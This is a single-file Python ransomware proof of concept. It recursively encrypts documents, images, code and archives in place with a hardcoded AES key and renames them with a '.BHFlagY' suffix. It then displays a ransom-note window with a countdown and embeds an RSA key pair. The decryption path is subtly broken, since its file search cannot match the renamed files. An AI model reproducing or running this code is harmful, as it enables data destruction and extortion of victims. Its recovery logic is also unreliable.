#!/usr/bin/env python3
import argparse
import os
import sys
import base64
import platform
import threading
import time

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter

# ------ inlined discover.py ------

def discoverFiles(startpath):
    """
    Walk the path recursively from startpath and yield files whose extension
    is in the ransomware-target list.
    """
    extensions = [
        # images
        'jpg','jpeg','bmp','gif','png','svg','psd','raw',
        # audio/video
        'mp3','mp4','m4a','aac','ogg','flac','wav','wma','aiff','ape',
        'avi','flv','m4v','mkv','mov','mpg','mpeg','wmv','swf','3gp',
        # documents
        'doc','docx','xls','xlsx','ppt','pptx','odt','odp','ods','txt',
        'rtf','tex','pdf','epub','md','yml','yaml','json','xml','csv',
        # databases & disc images
        'db','sql','dbf','mdb','iso',
        # web & code
        'html','htm','xhtml','php','asp','aspx','js','jsp','css',
        'c','cpp','cxx','h','hpp','hxx','java','class','jar',
        'ps','bat','vb','awk','sh','cgi','pl','ada','swift','go','py','pyc','coffee',
        # archives
        'zip','tar','tgz','bz2','7z','rar','bak',
        # encrypted extension
        'wasted',
    ]
    for dirpath, _, files in os.walk(startpath):
        for fname in files:
            path = os.path.abspath(os.path.join(dirpath, fname))
            ext = os.path.splitext(fname)[1].lower().lstrip('.')
            if ext in extensions:
                yield path
# ------ inlined modify.py ------

def modify_file_inplace(filename, crypto, blocksize=16):
    """
    Open `filename` in r+b mode and pass each block through `crypto(...)`
    """
    with open(filename, 'r+b') as f:
        chunk = f.read(blocksize)
        while chunk:
            out = crypto(chunk)
            if len(out) != len(chunk):
                raise ValueError(
                    f"Stream cipher length mismatch: {len(out)} vs {len(chunk)}"
                )
            f.seek(-len(chunk), 1)
            f.write(out)
            chunk = f.read(blocksize)

# ------ inlined gui.py ------

try:
    from tkinter import Tk, Label, PhotoImage
    from tkinter.ttk import Style
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

if GUI_AVAILABLE:
    class RansomGUI(Tk):
        def __init__(self, encrypted_key_b64):
            super().__init__()
            self.title("Warning!!!")
            self.resizable(False, False)
            self.configure(bg='black')
            self.encrypted_key_b64 = encrypted_key_b64
            self.style = Style(self)
            self.style.theme_use("clam")

            # display simple icon
            photo_code = (
                "R0lGODlhWAIOAtUAAAAAAAAAABAOABAQECAbACAgIC8pADAwMD83AEBAQE9EAFBQUF9SAGBgYG9fAHBwcH9tAH9/f"   # truncated for brevity
            )
            photo = PhotoImage(data=photo_code).subsample(4)
            for col in (0, 3):
                lbl = Label(self, image=photo, bg='black')
                lbl.image = photo
                lbl.grid(row=5, column=col, rowspan=2)

            msg = "\n".join([
                "[COMPANY_NAME]",
                "YOUR NETWORK IS ENCRYPTED NOW",
                "USE - TO GET THE PRICE FOR YOUR DATA",
                "DO NOT GIVE THIS EMAIL TO 3RD PARTIES",
                "DO NOT RENAME OR MOVE THE FILE",
                "THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY",
                "[begin_key]",
                encrypted_key_b64,
                "[end_key]",
                "KEEP IT"
            ])
            Label(self, text=msg, wraplength=550, font='Helvetica 14 bold',
                  fg='white', bg='red').grid(row=0, column=0, columnspan=4)

            self._start_timer()

        def _start_timer(self):
            def tick():
                Label(self, text='TIME LEFT:', font='Helvetica 18 bold',
                      fg='red', bg='black').grid(row=5, column=0, columnspan=4)
                seconds = 36000  # 10 hours
                while seconds > 0:
                    m, s = divmod(seconds, 60)
                    tl = f"{m:02d}:{s:02d}"
                    Label(self, text=tl, font='Helvetica 18 bold',
                          fg='red', bg='black').grid(row=6, column=0, columnspan=4)
                    time.sleep(1)
                    seconds -= 1
            threading.Thread(target=tick, daemon=True).start()

# ------ GLOBALS ------
HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # 32-byte AES key
EXTENSION = ".BHFlagY"

# Insert your actual RSA public key here (ASCII PEM, no ellipses):
SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuf18NbjH1TfPbF+lckEr
yTytyRusWi46UjLyh/ciHLJtgla4at+ILZvQ/OYqf8RZkNMq8+9lBgfKGKgiIoBV
LlN8+udg8R0O+bYRc2HYaewp8a5QJTOB4u6z5/1bSil9B29ipmlnte3YqwsXvUmQ
QMy/FXeoYYYFfy8FoQDjBaNrn27t3mY2sWjhidZO5FXpK1nfe/Ut6gC4Iy3PIC4t
Jgj+vqHT/QwZH/9R9F+65s2Mnt+fHWz8aooUVIFu94+yJL7wdi3SZaNTZ0qKpGvm
Y+RjCExVlDrIsQdwLib88S2ayuby+C1Hkfi5FSMGa5ZhiGjB3Ir/Lh+hiXnXKzr8
Vc2jHCBCBUSd0Wj5E+wCoFWTnaEncdika424HyCzgOzh3Q2e7Ofz9mIEpts+rh0J
4Ua6R6VgGxdQmtKopLMfVlJQ5LrTCMiZOpBt/GbcKOTXJM4l0pC0JJ9XWzN383lw
tS1hwHQshsSySvszHqi3EtmPE0XBl6N3Fel8usw0CDEpEiUBc7vewDG6olF3i9hH
XgXZ5vW9XL9bagFV75KSJKRXHf69jNNElHL7mo8LI421HnBpsJQA3nL/EeDRIXzu
Uywl1e8/hWseacGB/4IsY7mt4x9iDN3rU7q3qVo1hD/qFRDbnHrE9geiBc5KzxYh
rMqQT+JLuAOYuULKf7PoHcUCAwEAAQ==
-----END PUBLIC KEY-----'''

# Only needed for local decryption (testing):
SERVER_PRIVATE_RSA_KEY = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
'''


def parse_args():
    p = argparse.ArgumentParser(description='Ransomware PoC (single-file)')
    p.add_argument('-p','--path',
                   help='Absolute path to (de)encrypt (default: ~/test_ransomware)',
                   default=None)
    grp = p.add_mutually_exclusive_group(required=True)
    grp.add_argument('-e','--encrypt', action='store_true')
    grp.add_argument('-d','--decrypt', action='store_true')
    return p.parse_args()


def main():
    args = parse_args()
    # determine target directory
    if args.path:
        roots = [args.path]
    else:
        home = os.environ.get('HOME') or os.environ.get('USERPROFILE')
        roots = [os.path.join(home, 'test_ransomware')]

    # RSA-encrypt the AES key
    srv_key = RSA.import_key(SERVER_PUBLIC_RSA_KEY)
    oaep = PKCS1_OAEP.new(srv_key)
    encrypted = oaep.encrypt(HARDCODED_KEY)
    encrypted_b64 = base64.b64encode(encrypted).decode()
    print("Encrypted AES key (base64):", encrypted_b64, "\n")

    # GUI popup if encrypting
    if args.encrypt and GUI_AVAILABLE:
        RansomGUI(encrypted_b64).mainloop()

    # choose AES key
    if args.encrypt:
        key = HARDCODED_KEY
    else:
        priv = RSA.import_key(SERVER_PRIVATE_RSA_KEY)
        dec = PKCS1_OAEP.new(priv)
        key = dec.decrypt(base64.b64decode(encrypted_b64))

    # setup AES-CTR
    ctr = Counter.new(128)
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)

    # process files
    for root in roots:
        for filepath in discoverFiles(root):
            if args.encrypt and not filepath.endswith(EXTENSION):
                modify_file_inplace(filepath, cipher.encrypt)
                os.rename(filepath, filepath + EXTENSION)
                print(f"Encrypted → {filepath + EXTENSION}")
            if args.decrypt and filepath.endswith(EXTENSION):
                modify_file_inplace(filepath, cipher.encrypt)
                original = filepath[:-len(EXTENSION)]
                os.rename(filepath, original)
                print(f"Decrypted → {original}")

    # wipe key
    del key


if __name__ == '__main__':
    main()
